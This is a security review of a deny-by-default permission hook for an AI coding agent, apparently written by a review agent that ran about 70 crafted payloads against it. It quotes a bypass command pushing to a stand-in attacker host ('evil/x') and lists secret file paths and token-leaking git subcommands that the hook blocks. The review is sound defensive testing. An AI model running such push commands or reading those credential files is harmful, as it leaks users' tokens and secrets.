# Implementation review — security-sentinel (2026-06-08)

The v3.1 plan was reviewed by a 4-agent panel (security-sentinel, spec-flow-analyzer,
architecture-strategist, CPO) — all P0 findings folded in. After implementation, the
**actual code** (hook parser/regex + substrate + D6) was re-reviewed by security-sentinel,
which drove `decide()` via the real hook binary against ~70 crafted payloads and
cross-checked the tokenizer against bash ground truth.

## Verdict: core sound; 1 ship-blocking P1 (fixed) + 2 P2 (1 fixed, 1 confirmed-intended)

**P1 (FIXED — commit `fix(cron): close security-review P1`):** `git push --repo=https://evil/x`
(and `--repo <url>`) escaped `gitVerbReason`'s origin-only check — the `-`-prefixed token was
filtered out of the positional scan. git docs: `--repo` is equivalent to the positional
`<repository>`. Now explicitly rejected unless it resolves to `origin`. Test added; normal
`git push -u origin <branch>` still allowed.

**P2 (FIXED):** `.git-credentials` added to the Read/Grep/Glob secret-path denylist
(defense-in-depth; no store helper configured today).

**P2 (confirmed-intended, no change):** `--body-file <non-secret-path>` is allowed (the
legitimate scope-out filing pattern). Safe under the invariant — the agent cannot first
*write* a secret into the file because every secret read is denied, so the body can't contain
a secret.

## Verified sound (no exfil chain found against the actual parser)

- Quoting/metachar wall: `$(...)`/backtick denied even inside double quotes; `|`/`>`/`<`/`&`,
  here-docs/here-strings, ANSI-C `$'...'`, unbalanced quotes — all DENY. Tokenizer matches
  bash ground truth; prefix-spoof (`ghx`, `gh-evil`) DENY.
- Secret reads: `.git/config` (GH_TOKEN location), `/proc/self/environ`, `.env*`,
  `~/.config/gh/hosts.yml`, `.gitconfig`, `.claude/`, path-traversal — all DENY across
  Bash AND Read/Grep/Glob.
- git token-leak subcommands (`git config`/`remote`/`ls-remote`/`-c core.sshCommand`) DENY.
- Catch-all default deny (WebFetch/WebSearch/Task/mcp__*) holds; inert ToolSearch/TodoWrite allowed.
- `runHookSelfTest` correctly fail-closed (throws on non-zero/missing-node/malformed output);
  `resolveNodeBin` absolute path avoids PATH-drift fail-open; hook always exits 0.
- D6 deferral: `TIER2_DEFERRED_CRONS` excludes the Tier-1 roadmap-review; honest heartbeat, no faked output.

Reviewer conclusion: "the core thesis — deny-by-default at tool-class granularity +
secret-out-of-context — is correctly implemented; I could not construct a working
secret-exfil chain against the actual parser."
